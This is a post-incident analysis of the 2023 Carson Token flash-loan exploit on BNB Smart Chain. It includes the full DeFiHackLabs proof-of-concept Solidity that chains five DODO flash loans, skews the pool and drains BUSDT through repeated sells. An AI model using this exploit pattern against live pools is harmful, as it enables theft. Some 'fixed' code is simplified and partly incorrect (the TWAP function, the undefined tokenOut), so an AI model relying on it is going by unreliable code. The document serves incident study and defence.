# Carson Token — Flawed Price Dependency Analysis

| Item | Details |
|------|------|
| **Date** | 2023-07-26 |
| **Protocol** | Carson Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$150,000 USD (on-chain measured: 100,677 BUSDT) |
| **Attacker** | [0x25Bc...2BD3](https://bscscan.com/address/0x25bcbbb92c2ae9d0c6f4db814e46fd5c632e2bd3) |
| **Attack Contract** | [0x9CFf...38ac](https://bscscan.com/address/0x9cffc95e742d22c1446a3d22e656bb23835a38ac) |
| **Attack Tx** | [0x37d9...3ac](https://bscscan.com/tx/0x37d921a6bb0ecdd8f1ec918d795f9c354727a3ff6b0dba98a512fceb9662a3ac) |
| **Vulnerable Contract** | [Carson Token (custom pair)](https://bscscan.com/address/0x0aCD5019EdC8ff765517e2e691C5EeF6f9c08830) |
| **Root Cause** | Custom AMM pair contract relies on the current block's spot price, making it vulnerable to flash loan-based price manipulation |
| **Attack Block** | [30306325](https://bscscan.com/block/30306325) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Carson_exp.sol) |
| **References** | [BeosinAlert](https://twitter.com/BeosinAlert/status/1684393202252402688) · [Phalcon](https://twitter.com/Phalcon_xyz/status/1684503154023448583) · [Hexagate](https://twitter.com/hexagate_/status/1684475526663004160) |

---

## 1. Vulnerability Overview

Carson Token is a token protocol operating on BSC that uses a custom-built AMM pair contract (closed source) to exchange tokens against BUSDT.

The core vulnerability is a **Flawed Price Dependency**. This custom pair contract directly references the current block's real-time pool reserves (spot price) — rather than TWAP (Time-Weighted Average Price) or an external oracle — when calculating trade amounts. The attacker exploited this by:

1. Borrowing approximately 1,739,844 BUSDT uncollateralized via chained flash loans across 5 DODO DPP (Decentralized Private Pool) pools
2. Performing a large buy to drastically skew the Carson/BUSDT pool's price ratio
3. Executing 51 repeated small sells of Carson while the spot price remained distorted, receiving an excessive amount of BUSDT on each trade
4. Repaying the flash loan principal and realizing a net profit of approximately 100,677 BUSDT

The entire attack was completed within a single transaction and required no upfront capital.

---

## 2. Vulnerable Code Analysis

### 2.1 Custom Pair Contract's Spot Price Dependency (Core Vulnerability)

The Carson project's pair contract is closed source and has not been publicly disclosed; however, based on the PoC and on-chain behavioral analysis, the following structure is inferred.

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: calculates price by directly referencing current block's real-time pool reserves
function swap(
    uint256 amountIn,
    address tokenIn,
    address to
) external returns (uint256 amountOut) {
    // ❌ Uses current reserves as-is — can be manipulated at any time via flash loan
    (uint256 reserve0, uint256 reserve1) = getReserves();
    
    // ❌ amountOut calculated based on spot price — produces excessive output when price is skewed
    // After a large buy, reserve0 decreases and reserve1 increases, causing abnormally high output
    amountOut = (amountIn * reserve1) / (reserve0 + amountIn);
    
    // ❌ No slippage protection, no price deviation detection
    IERC20(tokenOut).transfer(to, amountOut);
    _update();
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: uses TWAP oracle with multiple defensive layers
function swap(
    uint256 amountIn,
    address tokenIn,
    address to,
    uint256 minAmountOut  // ✅ Added minimum output parameter (slippage protection)
) external returns (uint256 amountOut) {
    // ✅ TWAP-based price reference (30-minute to 1-hour moving average)
    // Flash loan manipulation within a single block cannot alter the TWAP
    uint256 twapPrice = getTWAPPrice(tokenIn, 1800); // 30-minute TWAP
    
    amountOut = (amountIn * twapPrice) / PRECISION;
    
    // ✅ Slippage protection: revert if output falls below minimum
    require(amountOut >= minAmountOut, "Slippage: insufficient output");
    
    // ✅ Spot vs TWAP deviation check: revert if deviation exceeds 5%
    (uint256 reserve0, uint256 reserve1) = getReserves();
    uint256 spotPrice = (reserve1 * PRECISION) / reserve0;
    require(
        spotPrice <= twapPrice * 105 / 100 &&
        spotPrice >= twapPrice * 95 / 100,
        "Price: excessive deviation from TWAP"
    );
    
    IERC20(tokenOut).transfer(to, amountOut);
    _update();
}
```

**Problem**: Spot price can be freely manipulated within a single transaction using a flash loan. As soon as a large buy shifts the pool ratio, a new spot price is established, and all subsequent sell transactions are processed at the distorted price. The key mechanism is realizing cumulative profit on each of 50 repeated sells.

### 2.2 No Slippage Protection — `amountOutMin = 0` on Router Call

In the PoC, the attacker sets `amountOutMin` to 0 when calling the Router. While this is an intentional attacker choice, the protocol itself should not allow a value of 0.

**Vulnerable Code (inferred)**:
```solidity
// ❌ Vulnerable: allows amountOutMin = 0, neutralizing slippage protection
function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,  // ❌ Can be set to 0 — accepts any unfavorable price
    address[] calldata path,
    address to,
    uint256 deadline
) external {
    TransferHelper.safeTransferFrom(path[0], msg.sender, pairFor(path[0], path[1]), amountIn);
    _swapSupportingFeeOnTransferTokens(path, to);
    // ❌ No validation of final output amount
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: enforce amountOutMin > 0 and verify actual amount received
function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
) external {
    // ✅ Prevent slippage protection bypass
    require(amountOutMin > 0, "Router: amountOutMin must be > 0");
    
    uint256 balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);
    TransferHelper.safeTransferFrom(path[0], msg.sender, pairFor(path[0], path[1]), amountIn);
    _swapSupportingFeeOnTransferTokens(path, to);
    
    // ✅ Verify actual amount received (based on real received amount for fee-on-transfer tokens)
    require(
        IERC20(path[path.length - 1]).balanceOf(to) - balanceBefore >= amountOutMin,
        'Router: INSUFFICIENT_OUTPUT_AMOUNT'
    );
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No upfront capital required: attacker EOA starts with 0 BUSDT
- Entire attack completed in a single transaction (block 30306325)
- Unlimited Router approvals for BUSDT and Carson token set within the transaction

### 3.2 Execution Phase

| Step | Function | Purpose | Amount |
|------|------|------|------|
| 1 | `DPPOracle1.flashLoan()` | BUSDT flash loan (chain start) | 641,735 BUSDT |
| 2 | `DPPOracle2.flashLoan()` | Additional BUSDT loan (within callback) | 190,522 BUSDT |
| 3 | `DPPOracle3.flashLoan()` | Additional BUSDT loan | 676,888 BUSDT |
| 4 | `DPP.flashLoan()` | Additional BUSDT loan | 81,511 BUSDT |
| 5 | `DPPAdvanced.flashLoan()` | Additional BUSDT loan (chain complete) | 149,185 BUSDT |
| 6 | `BUSDTToCarson()` | 1,500,000 BUSDT → large Carson buy (price skew) | 1,500,000 BUSDT → ~355,794 Carson |
| 7 | `CarsonToBUSDT()` × 50 | Repeated sell of 5,000 Carson × 50 times | Distorted price applied per sell |
| 8 | `CarsonToBUSDT()` | Sell remaining Carson balance in full | Entire remaining balance |
| 9 | Flash loan repayment (reverse order) | DPPAdvanced → DPP → DPPOracle3 → DPPOracle2 → DPPOracle1 | Full principal repaid |

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  Attacker EOA (0x25Bc...2BD3)                           │
│                  Balance: 0 BUSDT                                       │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │ calls attack contract
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [1] DPPOracle1.flashLoan(0, 641,735 BUSDT, ...)                        │
│      DODO DPP Pool #1 → transfers 641,735 BUSDT to attack contract      │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │ DPPFlashLoanCall() callback
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [2] DPPOracle2.flashLoan(0, 190,522 BUSDT, ...)   → chaining          │
│  [3] DPPOracle3.flashLoan(0, 676,888 BUSDT, ...)   → chaining          │
│  [4] DPP.flashLoan(0, 81,511 BUSDT, ...)           → chaining          │
│  [5] DPPAdvanced.flashLoan(0, 149,185 BUSDT, ...)  → chain complete     │
│  ──────────────────────────────────────────────────                     │
│  Total raised: ~1,739,844 BUSDT (sum of 5 DODO pools)                  │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │ DPPAdvanced callback (enters else branch)
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [6] BUSDTToCarson()                                                    │
│      1,500,000 BUSDT ──▶ Carson custom Router ──▶ ~355,794 Carson       │
│      Result: Carson/BUSDT spot price spikes sharply (pool ratio skewed) │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [7] CarsonToBUSDT() × 50 iterations                                   │
│      Each: 5,000 Carson ──▶ Carson Router (distorted spot price)        │
│      ──▶ Excessive BUSDT received (surplus over fair price)             │
│                                                                         │
│  [8] Remaining Carson balance ──▶ Carson Router ──▶ BUSDT received      │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │ flash loan repayment (reverse order)
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  DPPAdvanced ◀── DPP ◀── DPPOracle3 ◀── DPPOracle2 ◀── DPPOracle1      │
│  Full flash loan principal repaid in BUSDT                              │
└─────────────────────────────┬───────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  Attacker EOA balance: +100,677 BUSDT (~$100,677 USD)                   │
│  (Difference between reported ~$150,000 and on-chain measured value     │
│   reflects fees and distribution structure in the estimate vs. net)     │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker net profit**: 100,677 BUSDT (on-chain measured)
- **Protocol damage**: Carson token pool liquidity drained
- **Time to complete**: Single transaction, finalized within block 30306325

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Carson_exp.sol

contract CarsonTest is Test {
    // Relevant contract address declarations
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);   // BSC USDT
    IERC20 Carson = IERC20(0x0aCD5019EdC8ff765517e2e691C5EeF6f9c08830);  // Carson token
    
    // 5 DODO DPP pools — flash loan sources
    IDPPOracle DPPOracle1 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle DPPOracle2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle DPPOracle3 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle DPP        = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    
    // Carson custom Router (Closed Source — core of the vulnerability)
    Uni_Router_V2 Router = Uni_Router_V2(0x2bDFb2f33E1aaEe08719F50d05Ef28057BB6341a);

    function testExploit() public {
        // Attack begins: starting from zero balance
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
        // After attack completes, attacker holds ~100,677 BUSDT
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // [Steps 1-5] Chain 5 DODO pools sequentially to raise large BUSDT capital
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else {
            // [Step 6] Enter core attack logic
            // PoC comment: "Root cause of the exploit stem from the customized pair contract"
            BUSDT.approve(address(Router), type(uint256).max);
            Carson.approve(address(Router), type(uint256).max);
            
            // [Step 6] Large buy of Carson with 1,500,000 BUSDT → triggers spot price spike
            BUSDTToCarson();
            
            // [Step 7] Repeated small sells while price is distorted
            // Each sell uses distorted spot price → excess BUSDT received
            for (uint256 i; i < 50; ++i) {
                CarsonToBUSDT(5000 * 1e18);  // 5,000 Carson × 50 iterations
            }
            // [Step 8] Sell entire remaining Carson balance
            CarsonToBUSDT(Carson.balanceOf(address(this)));
        }
        // [Step 9] Repay flash loan principal (automatically handled in reverse call stack order)
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    // Buy Carson with 1,500,000 BUSDT (for price manipulation)
    function BUSDTToCarson() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(Carson);
        // amountOutMin = 0: no slippage protection (intentionally set by attacker)
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1_500_000 * 1e18, 0, path, address(this), block.timestamp + 1000
        );
    }

    // Sell Carson for BUSDT (repeated profit extraction)
    function CarsonToBUSDT(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(Carson);
        path[1] = address(BUSDT);
        // Receives excessive BUSDT at distorted spot price
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp + 1000
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Custom AMM pair spot price dependency | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Flash loan-based price manipulation | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-03 | No slippage protection | MEDIUM | CWE-20 (Improper Input Validation) |

### V-01: Custom AMM Pair Spot Price Dependency (Core)

- **Description**: The Carson project's custom pair contract (closed source) directly references the current block's real-time pool reserves (spot price) to calculate the output token amount. This value can be freely manipulated via flash loan within a single transaction.
- **Impact**: After skewing the spot price with a flash loan, each repeated sell receives more BUSDT than fair value. Approximately 100,677 BUSDT was drained in a single transaction.
- **Attack Conditions**: Sufficient liquidity available to borrow (flash loan); existence of a spot price-dependent pair contract
- **Similar Incidents**: Allbridge (2023-04, BSC), 0vix Protocol (2023-04, Polygon), BGM Token (2024-11, BSC), ZongZi Token (2024-03, BSC)

### V-02: Flash Loan-Based Price Manipulation

- **Description**: The attacker borrows approximately 1,739,844 BUSDT uncollateralized through chained flash loans across 5 DODO DPP pools. DODO DPP pools allow uncollateralized borrowing via the `DPPFlashLoanCall` callback interface; by chaining multiple pools, capital exceeding any individual pool's limit can be raised within a single transaction.
- **Impact**: Acquires large-scale price manipulation capital with no capital of one's own. Prerequisite for exploiting vulnerability V-01.
- **Attack Conditions**: Access to DODO DPP pools (permissionless)
- **Similar Incidents**: bZx Attack (2020), Cream Finance (2021)

### V-03: No Slippage Protection

- **Description**: In the PoC, the Router is called with `amountOutMin = 0`, and the protocol permits this value. For normal users, this leaves them completely exposed to sandwich attacks by MEV bots. From the attacker's perspective, setting 0 intentionally ensures the trade is never rejected even during price manipulation.
- **Impact**: Slippage protection neutralized; trades accepted at any unfavorable price
- **Attack Conditions**: No validation of the `amountOutMin` parameter

---

## 6. Remediation Recommendations

### Immediate Actions

#### [V-01] Introduce TWAP Oracle

```solidity
// ✅ Uniswap V2-style TWAP cumulative value management
uint256 public price0CumulativeLast;
uint256 public price1CumulativeLast;
uint32 public blockTimestampLast;

// ✅ 30-minute TWAP query function
function getTWAPPrice(address token, uint32 period) public view returns (uint256) {
    // Calculates moving average based on cumulative price values
    // Cannot be altered by flash loan manipulation within a single block
    uint256 priceCumulative = token == token0
        ? price0CumulativeLast
        : price1CumulativeLast;
    uint32 timeElapsed = uint32(block.timestamp) - blockTimestampLast;
    require(timeElapsed >= period, "TWAP: insufficient time elapsed");
    return priceCumulative / period;
}
```

#### [V-01] Price Deviation Circuit Breaker

```solidity
// ✅ Block trades when spot price deviates more than 5% from TWAP
modifier spotPriceCheck() {
    uint256 twap = getTWAPPrice(token0, 1800);
    (uint256 r0, uint256 r1) = getReserves();
    uint256 spot = (r1 * PRECISION) / r0;
    require(
        spot <= twap * 105 / 100 && spot >= twap * 95 / 100,
        "Circuit breaker: price deviation exceeds 5%"
    );
    _;
}
```

#### [V-03] Enforce Slippage Protection

```solidity
// ✅ Disallow amountOutMin = 0
require(amountOutMin > 0, "Router: slippage protection required");
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Spot price dependency | Adopt one of: Uniswap V2 TWAP, Chainlink Price Feed, or Band Protocol |
| Flash loan manipulation | Set a threshold for reserve changes within a single block (e.g., lock if change exceeds 10%) |
| Repeated small sells | Limit swap count per address per block (e.g., max 5 per block) |
| Closed source operation | All custom contracts must undergo an independent security audit before deployment |
| No slippage protection | Enforce minimum `amountOutMin` on both the frontend and at the contract level |

---

## 7. Lessons Learned

1. **Custom AMMs must undergo external audits.** Carson's custom pair contract was closed source and not publicly disclosed. Any custom AMM with price calculation logic that differs from standard Uniswap V2 must undergo an independent security audit prior to deployment.

2. **DEX price calculation logic must be TWAP-based.** The current block's spot price can be freely manipulated within a single transaction via flash loan. Uniswap V2's cumulative TWAP approach, Uniswap V3's tick-based TWAP, or an external oracle must be used instead.

3. **Flash loan chaining bypasses single-pool limits.** Chaining 5 DODO DPP pools allows raising uncollateralized capital far exceeding any individual pool's limit. Protocols that rely on spot price are exposed to large-scale price manipulation through this technique.

4. **The pattern of 50 repeated small sells is a textbook exploitation of price dependency vulnerabilities.** Rather than executing a single large sell, repeated small sells cause the distorted price to be applied individually to each trade, maximizing cumulative profit. On-chain monitoring to detect this pattern is necessary.

5. **Slippage protection must be enforced on both the user and protocol sides.** Allowing `amountOutMin = 0` also leaves normal users vulnerable to sandwich attacks by MEV bots.

6. **Closed source contracts make incident response more difficult.** Vulnerability analysis, damage assessment, and patch development are all delayed due to the non-public source. Open-sourcing contracts or using verified contracts should be a standing principle.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC / Reported Value | On-Chain Measured Value | Notes |
|------|--------------|-------------|------|
| Total reported loss | ~$150,000 USD | 100,677 BUSDT | Difference: estimated value including fees/distribution vs. measured net profit |
| Attacker net profit | ~$150,000 | 100,677.05 BUSDT | On-chain measured (after block 30306325) |
| Large buy amount | 1,500,000 BUSDT | 1,500,000 BUSDT (confirmed in log #7) | Exact match |
| Total BUSDT raised | ~1.7M estimated | 1,739,844 BUSDT (sum of 5 pools) | Sum of logs #1–#5 |
| Carson received | Estimated | ~355,794 Carson (confirmed in log #8) | Includes fee-on-transfer |

### 8.2 Key On-Chain Event Log Sequence

Transaction `0x37d9...3ac` generated a total of 427 Transfer events; the key flow is as follows:

```
[1]  BUSDT: DPPOracle1 → AttackContract  (641,735 BUSDT — Flash Loan 1)
[2]  BUSDT: DPPOracle2 → AttackContract  (190,522 BUSDT — Flash Loan 2)
[3]  BUSDT: DPPOracle3 → AttackContract  (676,888 BUSDT — Flash Loan 3)
[4]  BUSDT: DPP      → AttackContract    (81,511 BUSDT — Flash Loan 4)
[5]  BUSDT: DPPAdvanced → AttackContract (149,185 BUSDT — Flash Loan 5)
[6]  BUSDT: AttackContract → Intermediary (1,739,844 BUSDT aggregated, routed to Router)
[7]  BUSDT: AttackContract → Carson Pair  (1,500,000 BUSDT — large buy)
[8]  Carson: Carson Pair → AttackContract (~355,794 Carson received)
... (50 repeated sells — each 5,000 Carson → BUSDT)
[N]  BUSDT: AttackContract → DPPAdvanced  (flash loan repayment begins)
... (reverse repayment complete)
```

### 8.3 Pre-condition Verification

| Item | Before Attack (Block 30306324) | After Attack (Block 30306325) |
|------|----------------------|----------------------|
| Attacker EOA BUSDT balance | 0 BUSDT | 100,677.05 BUSDT |
| Attack contract BUSDT balance | 0 BUSDT | 0 BUSDT (all transferred to EOA) |
| Attack block number | — | 30306325 |
| Attacker address (from) | — | 0x25BcBBb92C2aE9d0C6F4db814e46Fd5C632E2BD3 |
| Attack contract (to) | — | 0x9CFfc95e742d22c1446a3d22E656bB23835a38ac |

**Verification Result**: PoC analysis aligns with on-chain data. The attacker drained 100,677 BUSDT in a single transaction with no upfront capital. The discrepancy between the reported $150,000 loss and the on-chain measured value is attributed to $150,000 being an estimate of the total attempted theft (protocol-wide damage), while the on-chain figure represents the attacker EOA's final net profit.